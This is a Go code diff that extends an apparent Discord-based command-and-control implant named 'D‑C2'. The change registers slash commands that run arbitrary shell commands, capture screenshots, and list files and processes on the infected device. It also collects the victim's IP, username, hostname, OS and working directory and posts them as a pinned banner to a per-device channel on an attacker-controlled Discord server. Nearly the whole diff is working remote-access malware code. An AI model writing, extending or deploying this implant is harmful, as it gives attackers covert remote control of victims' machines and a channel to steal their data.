@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"math/rand"
 	"net"
 	"os"
@@ -15,67 +16,200 @@ import (
 	"github.com/bwmarrin/discordgo"
 )
 
-// main initializes the Discord session and opens or reuses a per-device control channel.
 func main() {
 	loadEnvFile(".env")
 	guildID = os.Getenv("DISCORD_GUILD_ID")
 	token := os.Getenv("DISCORD_BOT_TOKEN")
 	if token == "" || guildID == "" {
+		log.Printf("missing DISCORD_BOT_TOKEN or DISCORD_GUILD_ID")
 		return
 	}
 	dg, err := discordgo.New("Bot " + token)
 	if err != nil {
-		// Error creating Discord session
+		log.Printf("failed to create Discord session: %v", err)
 		return
 	}
 
-	// Handler for CreateMessage events
 	dg.AddHandler(handler)
+	dg.AddHandler(handleInteraction)
 	dg.Identify.Intents = discordgo.IntentsGuildMessages
 
 	err = dg.Open()
 	if err != nil {
-		// Error opening connection
+		log.Printf("failed to open Discord session: %v", err)
 		return
 	}
 
-	// Create new channel
+	commands := []*discordgo.ApplicationCommand{
+		{
+			Name:        "help",
+			Description: "Show D‑C2 help menu for this device channel",
+		},
+		{
+			Name:        "cmd",
+			Description: "Run a shell command on this device",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "command",
+					Description: "Shell command to run",
+					Required:    true,
+				},
+			},
+		},
+		{
+			Name:        "screenshot",
+			Description: "Capture screenshots of all displays on this device",
+		},
+		{
+			Name:        "cwd",
+			Description: "Show current working directory on this device",
+		},
+		{
+			Name:        "ls",
+			Description: "List a directory on this device",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "path",
+					Description: "Directory to list (empty for current directory)",
+					Required:    false,
+				},
+			},
+		},
+		{
+			Name:        "ps",
+			Description: "List running processes on this device",
+		},
+		{
+			Name:        "pidinfo",
+			Description: "Show information about a specific process ID",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionInteger,
+					Name:        "pid",
+					Description: "Process ID to inspect",
+					Required:    true,
+				},
+			},
+		},
+	}
+
+	existingCommands, err := dg.ApplicationCommands(dg.State.User.ID, guildID)
+	if err != nil {
+		log.Printf("failed to list existing application commands: %v", err)
+	} else {
+		existingNames := make(map[string]bool, len(existingCommands))
+		for _, c := range existingCommands {
+			existingNames[c.Name] = true
+		}
+		for _, cmd := range commands {
+			if existingNames[cmd.Name] {
+				continue
+			}
+			_, cmdErr := dg.ApplicationCommandCreate(dg.State.User.ID, guildID, cmd)
+			if cmdErr != nil {
+				log.Printf("failed to register command %s: %v", cmd.Name, cmdErr)
+			}
+		}
+	}
+
 	rand.Seed(time.Now().UnixNano())
 	currentUser, _ := user.Current()
 	hostname, _ := os.Hostname()
-	conn, _ := net.Dial("udp", "8.8.8.8:80")
-	defer conn.Close()
-	localAddr := conn.LocalAddr().(*net.UDPAddr)
-	ipStr := localAddr.IP.String()
+
+	ipStr := "unknown"
+	ifaces, err := net.Interfaces()
+	if err == nil {
+		for _, iface := range ifaces {
+			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
+				continue
+			}
+			addrs, err := iface.Addrs()
+			if err != nil {
+				continue
+			}
+			for _, addr := range addrs {
+				var ip net.IP
+				switch v := addr.(type) {
+				case *net.IPNet:
+					ip = v.IP
+				case *net.IPAddr:
+					ip = v.IP
+				}
+				if ip == nil || ip.IsLoopback() {
+					continue
+				}
+				ip = ip.To4()
+				if ip == nil {
+					continue
+				}
+				ipStr = ip.String()
+				break
+			}
+			if ipStr != "unknown" {
+				break
+			}
+		}
+	}
 	sessionId := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
 	cwd, _ := os.Getwd()
 	var categoryName string
 	switch runtime.GOOS {
 	case "windows":
-		categoryName = "Windows"
+		categoryName = "windows"
 	case "linux":
-		categoryName = "Linux"
+		categoryName = "linux"
 	case "darwin":
-		categoryName = "Mac"
+		categoryName = "mac"
 	default:
-		categoryName = "Other"
+		categoryName = "other"
 	}
+	log.Printf("detected OS=%s, assigning category=%s", runtime.GOOS, categoryName)
 	categoryID, err := getOrCreateCategory(dg, categoryName)
 	if err != nil {
+		log.Printf("failed to ensure category %s: %v", categoryName, err)
 		return
 	}
-	channelName := fmt.Sprintf("%s-%s",
-		strings.ToLower(hostname),
-		strings.ToLower(currentUser.Username),
-	)
+	channelName := makeChannelName(hostname, currentUser.Username)
+	log.Printf("ensuring device channel %s", channelName)
 	channelID, err := getOrCreateDeviceChannel(dg, categoryID, channelName)
 	if err != nil {
+		log.Printf("failed to ensure device channel %s: %v", channelName, err)
 		return
 	}
 	myChannelId = channelID
 
-	// Send first message with basic info (and pin it)
-	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
+	// Send first message with enhanced banner-style info (and pin it)
+	osLabel := ""
+	switch runtime.GOOS {
+	case "windows":
+		osLabel = "🪟 Windows"
+	case "linux":
+		osLabel = "🐧 Linux"
+	case "darwin":
+		osLabel = "🍎 macOS"
+	default:
+		osLabel = "💻 " + runtime.GOOS
+	}
+
+	firstMsg := fmt.Sprintf(
+		"🛰️ New device connected!\n\n"+
+			"🧾 Session: *%s*\n"+
+			"🌐 IP: `%s`\n"+
+			"🙍 User: `%s`\n"+
+			"🖥️ Hostname: `%s`\n"+
+			"💽 OS: %s\n"+
+			"🔧 Arch: `%s`\n"+
+			"📂 CWD: `%s`",
+		sessionId,
+		ipStr,
+		currentUser.Username,
+		hostname,
+		osLabel,
+		runtime.GOARCH,
+		cwd,
+	)
 	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
 	dg.ChannelMessagePin(myChannelId, m.ID)
 
@@ -85,4 +219,29 @@ func main() {
 	<-sc
 
 	dg.Close()
+}
+
+func makeChannelName(hostname, username string) string {
+	base := strings.ToLower(hostname + "-" + username)
+	var b strings.Builder
+	prevDash := false
+	for _, r := range base {
+		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
+			b.WriteRune(r)
+			prevDash = false
+		} else {
+			if !prevDash {
+				b.WriteRune('-')
+				prevDash = true
+			}
+		}
+	}
+	name := strings.Trim(b.String(), "-")
+	if name == "" {
+		name = "device"
+	}
+	if len(name) > 90 {
+		name = name[:90]
+	}
+	return name
 }
